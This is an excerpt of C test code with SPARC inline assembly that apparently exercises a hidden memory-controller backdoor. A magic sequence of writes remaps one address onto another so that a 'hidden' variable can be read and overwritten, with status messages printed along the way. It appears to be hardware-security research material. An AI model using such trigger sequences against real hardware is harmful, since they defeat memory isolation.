...
// Inform the memory sub-system to return the data at address 'target' when 'address' is asked for
void memMapAddress(volatile unsigned int *address, volatile unsigned int *target)
{
	// Trigger the memory sub-system to store the mapping
	// Send the mapping
	...
	__asm__ __volatile__(
		"sethi	%%hi(0xaaaa5400), %1\n\t"
		"or	%1, 0x155, %1\n\t"
		"st	%1, [%0]\n\t"
		"sethi	%%hi(0x5555a800), %1\n\t"
		"or	%1, 0x2aa, %1\n\t"
		"st	%1, [%0]\n\t"
		"sethi	%%hi(0xca5cc800), %1\n\t"
		"or	%1, 0x25C, %1\n\t"
		"st	%1, [%0]\n\t"
		"st	%2, [%3]\n\t"
		: "=r"(value), "=r"(temp), "=r"(target), "=r"(address)
		:
		: "memory"
	);*/
	*address = 0xaaaa5555;
	*address = 0x5555aaaa;
	*address = 0xca5cca5c;
	*address = (unsigned int)target;
}


void flushCache2(void)
{
	__asm__ __volatile__(
		"FLUSH\n\t"
		"nop\n\t"
...
{
    int i;
    volatile unsigned int mapping = 42;
    volatile unsigned int hidden = 24;
    unsigned int flushCache = 0x00400000;
    unsigned int cacheState;
    fixed = 0.0;
    floated = 0.0;

	printf("Hacking the memory controller!\nInitial values:\n");
    	printf("0x%8x (mapping):\t%d\n", &mapping, mapping);
	printf("0x%8x (hidden):\t%d\n", &hidden, hidden);
    	
	printf("Calling memory hack trigger\n");
	memMapAddress(&mapping, &hidden);
	
	printf("Pre cache flush values of mapping and hidden:\n");
	printf("0x%8x (mapping):\t0x%8x\n", &mapping, mapping);
	printf("0x%8x (hidden):\t%d\n", &hidden, hidden);
	
	printf("Flushing the cache\n");
	flushCache2();
	
	printf("Using the mapping to find the hidden value\n");
	printf("0x%8x (mapping):\t%d(should match the value of hidden)\n", &mapping, mapping);
	printf("0x%8x (hidden):\t%d\n", &hidden, hidden);

	printf("Trying to write 77 to the hidden address using the mapping\n");
	mapping = 77;

	printf("Flushing the cache\n");
	flushCache2();

	printf("0x%8x (mapping):\t%d(should be 77 due to remapping)\n", &mapping, mapping);
	printf("0x%8x (hidden):\t%d(should be 77 when hack works)\n", &hidden, hidden);

	printf("Undoing the mapping\n");
	memMapAddress(&mapping, &mapping);

	printf("Flushing the cache\n");
	flushCache2();

	printf("0x%8x (mapping):\t0x%8x\n", &mapping, mapping);
	printf("0x%8x (hidden):\t0x%8x\n", &hidden, hidden);
